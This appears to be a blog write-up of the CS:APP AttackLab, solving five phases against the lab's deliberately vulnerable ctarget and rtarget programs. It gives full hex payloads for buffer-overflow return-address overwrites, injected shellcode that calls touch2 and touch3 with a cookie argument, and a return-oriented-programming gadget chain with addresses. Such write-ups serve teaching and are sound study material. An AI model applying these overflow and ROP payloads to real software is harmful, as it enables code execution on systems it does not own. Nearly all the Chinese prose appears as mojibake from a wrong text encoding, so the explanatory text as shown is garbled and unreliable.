# AttackLabè‹¦ç—›ä¹‹è·¯
## ä¸€ã€å‡†å¤‡å·¥ä½œ
æ ¸å¿ƒè¯´æ˜ï¼šå‰3ä¸ªphaseåŸºäº`ctarget`ï¼Œå›´ç»•**ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆcode injection attacksï¼‰** å±•å¼€ï¼›å3ä¸ªphaseåŸºäº`rtarget`ï¼Œå›´ç»•**é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆreturn-oriented programmingï¼‰** å±•å¼€ã€‚è§£é¢˜éœ€åœ¨txtä¸­ç¼–å†™ç©ºæ ¼åˆ†éš”çš„å­—èŠ‚ç ï¼Œé€šè¿‡`hex2raw`å·¥å…·è½¬æ¢ä¸ºå­—ç¬¦ä¸²åï¼Œé‡å®šå‘è¾“å…¥ç»™å¯¹åº”targetç¨‹åºã€‚

1. åæ±‡ç¼–ç›®æ ‡æ–‡ä»¶ï¼Œè·å–æ±‡ç¼–ä»£ç ï¼š
   - `objdump -d ctarget > ctarget.asm`
   - `objdump -d rtarget > rtarget.asm`
2. èµ‹äºˆå¯æ‰§è¡Œæƒé™ï¼š`chmod +x hex2raw rtarget ctarget`
3. è‡ªå­¦çš„åŒå­¦éœ€æ·»åŠ `-q`å‚æ•°ï¼ˆé¿å…ç»“æœå‘é€è‡³æœåŠ¡å™¨ï¼‰ï¼Œæ³¨æ„å‚æ•°çš„ä½ç½®ï¼Œä¸ç„¶ğŸ‘‡
   ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511161640458.png)
4. è§£å†³`ctarget`è¿è¡ŒæŠ¥é”™ï¼š
   - åˆå§‹æŠ¥é”™ï¼š`-bash: ./ctarget: cannot execute binary file: Exec format error`
     ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511161735531.png)
   - åˆæ­¥æ’æŸ¥ï¼šè¯¯ä»¥ä¸ºæ˜¯WSL2 Ubuntuç¯å¢ƒè¿‡æ–°ï¼Œå°è¯•æ­å»ºå…¼å®¹ç¯å¢ƒã€‚çœ‹äº†ä»–çš„æ­¥éª¤ç›¸å½“ç¹çï¼ˆå¤´æ™•ï¼Œåé¢å‘ç°çº¯å±æ‰¯æ·¡
     ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511161737003.png)
   - æœ€ç»ˆè§£å†³æ–¹æ¡ˆï¼šé€šè¿‡`file ctarget`æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œå‘ç°è¾“å‡ºä¸º`data`ï¼Œåˆç†æ€€ç–‘æ˜¯æ–‡ä»¶æŸåï¼Œé‡æ–°è§£å‹å‹ç¼©åŒ…åæ¢å¤æ­£å¸¸
     ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511161740827.png)
5. å…³é”®å·¥å…·ä¸æŒ‡ä»¤è¯´æ˜ï¼š
   - `hex2raw`ï¼šå°†å­—èŠ‚ç è½¬æ¢ä¸ºç¨‹åºå¯æ¥æ”¶çš„è¾“å…¥å­—ç¬¦ä¸²
   - è‡ªå®šä¹‰æ±‡ç¼–ä»£ç è½¬äºŒè¿›åˆ¶ï¼šå…ˆé€šè¿‡`gcc -c example.s`ç¼–è¯‘ä¸ºç›®æ ‡æ–‡ä»¶ï¼Œå†ç”¨`objdump -d example.o > example.d`æå–äºŒè¿›åˆ¶å­—èŠ‚ç 

---

## äºŒã€ctarget
>å¦‚æœæ²¡æœ‰æ€è·¯ï¼Œå»ºè®®åå¤è¯»AttackLabçš„handoutã€‚é©»æ³¢ä¸€å¼€å§‹ä¸€ç‚¹æ€è·¯æ²¡æœ‰ï¼Œåé¢ç¿»è¯‘æˆä¸­æ–‡å†è¯»å‡ éå°±å¥½å¾ˆå¤šäº†

### 1. phase1
#### æ ¸å¿ƒéœ€æ±‚
`getbuf`å‡½æ•°æ‰§è¡Œreturnæ—¶ï¼Œä¸è¿”å›è°ƒç”¨è€…`test`ï¼Œç›´æ¥è·³è½¬åˆ°`touch1`å‡½æ•°ï¼ˆè§¦å‘`validate(1)`ï¼‰ã€‚

#### å…³é”®åˆ†æ
```c
void test(){
	int val;
	val = getbuf();
	printf("No exploit. ......")	
}
```
- `getbuf`å‡½æ•°ä»£ç ï¼šå†…éƒ¨å®šä¹‰`char buf[BUFFER_SIZE]`ï¼Œé€šè¿‡`Gets(buf)`è¯»å–è¾“å…¥ï¼ˆæ— è¾¹ç•Œæ£€æŸ¥ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼‰ã€‚
- æ±‡ç¼–ä»£ç å¯çŸ¥`BUFFER_SIZE = 0x28`ï¼ˆå³40å­—èŠ‚ï¼‰ï¼Œè¾“å…¥è¶…è¿‡40å­—èŠ‚ä¼šç ´åæ ˆç»“æ„ï¼Œè¦†ç›–è¿”å›åœ°å€ã€‚
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511161656233.png)

#### åˆå§‹å°è¯•ä¸è¸©å‘
- ç¼–å†™`phase1.txt`ï¼šå‰40å­—èŠ‚å¡«å……0ï¼Œå8å­—èŠ‚å†™å…¥`touch1`åœ°å€ï¼ˆ`0x4017c0`ï¼Œå°ç«¯åºï¼‰ã€‚
  ```txt
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  c0 17 40 00 00 00 00 00
  ```
- è¿è¡ŒæŠ¥é”™ï¼š`Segmentation fault`
![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511161804102.png)
- åŸå› æ˜¯Ubuntu 20.04/21.x/22.04ç‰ˆæœ¬å…¼å®¹é—®é¢˜ã€‚è§£å†³æ–¹æ³•è§[attackè¸©å‘ä¹‹segmentation fault](https://frank-whw.github.io/Others/Debug/segmentation%20fault/);åé¢å‘ç°ä¸å¦‚**ç›´æ¥å‡çº§ubuntuç‰ˆæœ¬è‡³24.04**
  
- è§£å†³æ–¹æ¡ˆï¼šå‡çº§Ubuntuè‡³24.04ç‰ˆæœ¬ï¼Œå…¼å®¹é—®é¢˜ç›´æ¥è§£å†³ã€‚
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511181423915.png)

### 2. phase2
#### æ ¸å¿ƒéœ€æ±‚
è°ƒç”¨`touch2`å‡½æ•°ï¼ˆåœ°å€`0x4017ec`ï¼‰ï¼Œä¸”éœ€å°†`cookie=0x59b997fa`ä¼ å…¥`%rdi`å¯„å­˜å™¨ï¼ˆå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ï¼Œç¦æ­¢ä½¿ç”¨`jmp`æˆ–`call`æŒ‡ä»¤ã€‚
![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511181335134.png)
#### é”™è¯¯æ€è·¯ä¸ä¿®æ­£
- åˆå§‹é”™è¯¯ï¼šç›´æ¥ä¿®æ”¹phase1çš„è¿”å›åœ°å€ä¸º`touch2`ï¼Œå¹¶åœ¨è¾“å…¥ä¸­æ·»åŠ `movq $0x59b997fa, %rdi`çš„äºŒè¿›åˆ¶ç ï¼Œä½†`Gets`ä»…å­˜å‚¨å­—ç¬¦ä¸²ä¸æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´å‚æ•°ä¼ é€’å¤±è´¥ï¼ŒæŠ¥é”™`Misfire: You called touch2(0x45e0a8e0)`ã€‚
```txt
48 c7 c7 fa 97 b9 59 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ec 17 40 00 00 00 00 00
```
å…¶ä¸­ 48 c7 c7 æ˜¯movq ...  %rdiçš„éƒ¨åˆ†ï¼Œfa 97 b9 59æ˜¯cookie=0x59b997façš„å°ç«¯æ³•
- æ­£ç¡®é€»è¾‘ï¼šè¾“å…¥å­—ç¬¦ä¸²éœ€åŒ…å«â€œä¿®æ”¹`%rdi`çš„ä»£ç  + è¿”å›`touch2`çš„ä»£ç â€ï¼Œè®©`getbuf`çš„returnç›´æ¥è·³è½¬åˆ°è¾“å…¥å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œæ‰§è¡Œæ³¨å…¥ä»£ç ã€‚

#### æ³¨å…¥ä»£ç ä¸äºŒè¿›åˆ¶è½¬æ¢
- ç¼–å†™æ±‡ç¼–æ–‡ä»¶`2_s.s`ï¼š
  ```s
  movq $0x59b997fa, %rdi  # å°†cookieä¼ å…¥%rdi
  push $0x4017ec           # å‹å…¥touch2åœ°å€
  ret                      # è·³è½¬è‡³touch2
  ```
- è½¬æ¢ä¸ºäºŒè¿›åˆ¶ç ï¼šé€šè¿‡`gcc -c 2_s.s`å’Œ`objdump -d 2_s.o`ï¼Œå¾—åˆ°äºŒè¿›åˆ¶åºåˆ—`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`ã€‚
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511181417875.png)

#### ç¡®å®šè¾“å…¥å­—ç¬¦ä¸²èµ·å§‹åœ°å€
- ä»`getbuf`æ±‡ç¼–ä»£ç å¯çŸ¥ï¼Œæ ˆæŒ‡é’ˆ`%rsp`åœ¨å¼€è¾Ÿ40å­—èŠ‚ç¼“å†²åŒºåçš„å€¼ä¸º`0x5561dc78`ï¼Œæ­¤åœ°å€å³ä¸ºè¾“å…¥å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ã€‚
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511181420754.png)

#### æœ€ç»ˆphase2.txt
```txt
48 c7 c7 fa 97 b9 59 68  # movq $cookie, %rdi; push $touch2
ec 17 40 00 c3 00 00 00  # ret; å¡«å……0
00 00 00 00 00 00 00 00  # å¡«å……0ï¼ˆå‡‘å¤Ÿ40å­—èŠ‚ç¼“å†²åŒºï¼‰
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00  # è¿”å›åœ°å€ï¼šè¾“å…¥å­—ç¬¦ä¸²èµ·å§‹åœ°å€0x5561dc78
```
- æ‰§è¡ŒæˆåŠŸï¼š
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511181422066.png)

### 3. phase3
#### æ ¸å¿ƒéœ€æ±‚
è°ƒç”¨`touch3`å‡½æ•°ï¼Œä¼ å…¥`cookie`çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆæ ¼å¼ä¸º`"59b997fa\0"`ï¼Œç©ºç»ˆæ­¢ç¬¦ä¸å¯å°‘ï¼‰ï¼Œéœ€é¿å…å­—ç¬¦ä¸²è¢«åç»­å‡½æ•°æ ˆæ“ä½œè¦†ç›–ã€‚

#### å…³é”®åˆ†æ
- `touch3`ä¾èµ–`hexmatch`å‡½æ•°æ ¡éªŒå­—ç¬¦ä¸²ï¼Œ`hexmatch`ä¼šå¼€è¾Ÿ110å­—èŠ‚ç¼“å†²åŒºï¼Œæ ˆæ“ä½œä¼šè¦†ç›–`getbuf`çš„40å­—èŠ‚ç¼“å†²åŒºï¼Œå› æ­¤å­—ç¬¦ä¸²éœ€å­˜æ”¾åœ¨40å­—èŠ‚ä¹‹åçš„â€œå®‰å…¨åŒºåŸŸâ€ã€‚
- å­—ç¬¦ä¸²ç¼–ç ï¼šæ ¹æ®ASCIIè¡¨ï¼Œ`"59b997fa\0"`å¯¹åº”çš„åå…­è¿›åˆ¶å­—èŠ‚ä¸º`35 39 62 39 39 37 66 61 00`ã€‚

#### æ³¨å…¥é€»è¾‘ä¸phase3.txt
- æ³¨å…¥ä»£ç åŠŸèƒ½ï¼šå°†å­—ç¬¦ä¸²å®‰å…¨åœ°å€ä¼ å…¥`%rdi`ï¼Œå†è·³è½¬è‡³`touch3`ï¼ˆåœ°å€`0x4018fa`ï¼‰ã€‚
- å®‰å…¨åœ°å€é€‰æ‹©ï¼š`0x5561dca8`ï¼ˆ40å­—èŠ‚ç¼“å†²åŒºä¹‹åï¼Œé¿å…è¢«è¦†ç›–ï¼‰ã€‚
- æœ€ç»ˆ`phase3.txt`ï¼š
  ```txt
  48 c7 c7 a8 dc 61 55 68  # movq $0x5561dca8, %rdi; push $touch3
  fa 18 40 00 c3 00 00 00  # ret; å¡«å……0
  00 00 00 00 00 00 00 00  # å¡«å……0ï¼ˆå‡‘å¤Ÿ40å­—èŠ‚ï¼‰
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 dc 61 55 00 00 00 00  # è¿”å›åœ°å€ï¼šè¾“å…¥å­—ç¬¦ä¸²èµ·å§‹åœ°å€0x5561dc78
  35 39 62 39 39 37 66 61 00  # å­—ç¬¦ä¸²"59b997fa\0"
  ```
- æ‰§è¡ŒæˆåŠŸï¼š
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511181659901.png)

---

## ä¸‰ã€rtarget
`rtarget`éš¾åº¦æå‡æ ¸å¿ƒï¼š1. æ ˆéšæœºåŒ–ï¼Œæ— æ³•ç¡®å®šæ³¨å…¥ä»£ç åœ°å€ï¼›2. æ ˆå†…å­˜æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œã€‚è§£é¢˜æ ¸å¿ƒæ˜¯å¤ç”¨ç°æœ‰ä»£ç ä¸­â€œä»¥`ret`ç»“å°¾çš„ä»£ç ç‰‡æ®µï¼ˆgadgetï¼‰â€ï¼Œé€šè¿‡æ ˆä¸­ä¸²è”gadgetåœ°å€å®ç°æ”»å‡»ã€‚

### 4. phase4ï¼šç”¨gadgetå¤ç°phase2åŠŸèƒ½
#### æ ¸å¿ƒéœ€æ±‚
é€šè¿‡`farm`ä¸­çš„gadgetï¼Œå®ç°â€œä¼ é€’`cookie=0x59b997fa`ç»™`%rdi` + è·³è½¬è‡³`touch2`â€ï¼Œä»…å…è®¸ä½¿ç”¨`movq/popq/ret/nop`æŒ‡ä»¤åŠå‰8ä¸ªå¯„å­˜å™¨ã€‚

#### å…³é”®æ­¥éª¤
1. æå–farmæ±‡ç¼–ä»£ç ï¼š
   ```bash
   gcc -c -o farm.o farm.c
   objdump -d farm.o > farm.asm
   ```
2. æŸ¥æ‰¾å…³é”®gadgetï¼š
   - éœ€æ±‚1ï¼šå°†cookieä¼ å…¥å¯„å­˜å™¨ï¼ˆæ— ç›´æ¥`pop %rdi`ï¼Œå…ˆ`pop %rax`ï¼‰ï¼Œå¯¹åº”gadgetåœ°å€`0x4019cc`ï¼ˆæŒ‡ä»¤ï¼š`pop %rax; ret`ï¼‰ã€‚
     ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511191149464.png)
   - éœ€æ±‚2ï¼šå°†`%rax`çš„å€¼ä¼ å…¥`%rdi`ï¼Œå¯¹åº”gadgetåœ°å€`0x4019c5`ï¼ˆæŒ‡ä»¤ï¼š`movq %rax, %rdi; nop; ret`ï¼Œå­—èŠ‚ç `48 89 c7 90 c3`ï¼‰ã€‚
     ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511191146937.png)
3. æ ˆç»“æ„è®¾è®¡ï¼ˆä»ä½åœ°å€åˆ°é«˜åœ°å€ï¼‰ï¼š
   - å‰40å­—èŠ‚ï¼šå¡«å……0ï¼ˆè¦†ç›–`getbuf`ç¼“å†²åŒºï¼‰ã€‚
   - åç»­å­—èŠ‚ï¼šä¾æ¬¡å­˜æ”¾`pop %rax`gadgetåœ°å€ã€cookieå€¼ã€`movq %rax, %rdi`gadgetåœ°å€ã€`touch2`åœ°å€ã€‚

#### æœ€ç»ˆphase4.txt
```txt
00 00 00 00 00 00 00 00  # å¡«å……0ï¼ˆå…±40å­—èŠ‚ï¼‰
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00  # gadget1ï¼špop %rax; retï¼ˆåœ°å€0x4019ccï¼‰
fa 97 b9 59 00 00 00 00  # cookieå€¼0x59b997fa
c5 19 40 00 00 00 00 00  # gadget2ï¼šmovq %rax, %rdi; retï¼ˆåœ°å€0x4019c5ï¼‰
ec 17 40 00 00 00 00 00  # touch2åœ°å€0x4017ec
```
- æ‰§è¡ŒæˆåŠŸï¼š
  ![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511191158306.png)

### 5. phase5ï¼šç”¨gadgetå¤ç°phase3åŠŸèƒ½
#### æ ¸å¿ƒéœ€æ±‚
é€šè¿‡gadgetå®ç°â€œè·å–cookieå­—ç¬¦ä¸²åœ°å€å¹¶ä¼ å…¥`%rdi` + è·³è½¬è‡³`touch3`â€ï¼Œéœ€è§£å†³æ ˆéšæœºåŒ–å¯¼è‡´çš„åœ°å€ä¸ç¡®å®šé—®é¢˜ã€‚

#### å…³é”®æ€è·¯
- å­—ç¬¦ä¸²å­˜æ”¾ï¼šå°†`"59b997fa\0"`å­˜å…¥`getbuf`ç¼“å†²åŒºï¼ˆ40å­—èŠ‚å†…ï¼‰ã€‚
- åœ°å€è®¡ç®—ï¼šåˆ©ç”¨`%rsp`ï¼ˆæ ˆæŒ‡é’ˆï¼‰ç›¸å¯¹ä½ç½®è·å–å­—ç¬¦ä¸²åœ°å€ï¼ˆ`%rsp + åç§»é‡`ï¼‰ï¼Œéœ€é€šè¿‡gadgetç»„åˆå®ç°åœ°å€è®¡ç®—ä¸å¯„å­˜å™¨ä¼ é€’ã€‚

#### å…³é”®gadgetæŸ¥æ‰¾ä¸ç»„åˆ
1. æ ¸å¿ƒgadgetæ¸…å•ï¼ˆå«åœ°å€ä¸åŠŸèƒ½ï¼‰ï¼š
   - `0x401a06`ï¼š`movq %rsp, %rax; ret`ï¼ˆå°†æ ˆæŒ‡é’ˆä¼ å…¥`%rax`ï¼‰
   - `0x4019c5`ï¼š`movq %rax, %rdi; ret`ï¼ˆ`%rax`å€¼ä¼ å…¥`%rdi`ï¼‰
   - `0x4019ab`ï¼š`pop %rax; ret`ï¼ˆæ¥æ”¶å­—ç¬¦ä¸²åç§»é‡`-40`ï¼‰
   - `0x4019dd`ï¼š`movl %eax, %edx; ret`ï¼ˆ`%eax`å€¼ä¼ å…¥`%edx`ï¼‰
   - `0x401a70`ï¼š`movl %edx, %ecx; ret`ï¼ˆ`%edx`å€¼ä¼ å…¥`%ecx`ï¼‰
   - `0x401a13`ï¼š`movl %ecx, %esi; ret`ï¼ˆ`%ecx`å€¼ä¼ å…¥`%esi`ï¼‰
   - `0x4019d6`ï¼š`leaq (%rdi,%rsi), %rax; ret`ï¼ˆè®¡ç®—`%rdi + %rsi`ï¼Œå³å­—ç¬¦ä¸²åœ°å€ï¼‰
   - `0x4019a2`ï¼š`movq %rax, %rdi; ret`ï¼ˆæœ€ç»ˆå­—ç¬¦ä¸²åœ°å€ä¼ å…¥`%rdi`ï¼‰

#### æ ˆç»“æ„è®¾è®¡ä¸phase5.txt
- å­—ç¬¦ä¸²ç¼–ç ï¼š`35 39 62 39 39 37 66 61 00`ï¼ˆå­˜äºç¼“å†²åŒºå‰9å­—èŠ‚ï¼‰ã€‚
- æ ˆç»“æ„ï¼ˆä»ä½åœ°å€åˆ°é«˜åœ°å€ï¼‰ï¼š
  1. å‰9å­—èŠ‚ï¼šå­—ç¬¦ä¸²`"59b997fa\0"`ã€‚
  2. 10-40å­—èŠ‚ï¼šå¡«å……0ï¼ˆå‡‘å¤Ÿ40å­—èŠ‚ç¼“å†²åŒºï¼‰ã€‚
  3. åç»­å­—èŠ‚ï¼šæŒ‰é¡ºåºå­˜æ”¾ä¸Šè¿°gadgetåœ°å€ã€åç§»é‡`-40`ã€`touch3`åœ°å€ã€‚

#### æ‰§è¡Œç»“æœ
æœ€ç»ˆé€šè¿‡gadgetç»„åˆæˆåŠŸä¼ é€’å­—ç¬¦ä¸²åœ°å€ï¼Œè§¦å‘`validate(3)`ï¼š
![image.png](https://raw.githubusercontent.com/Frank-whw/img/main/blog/202511191857583.png)
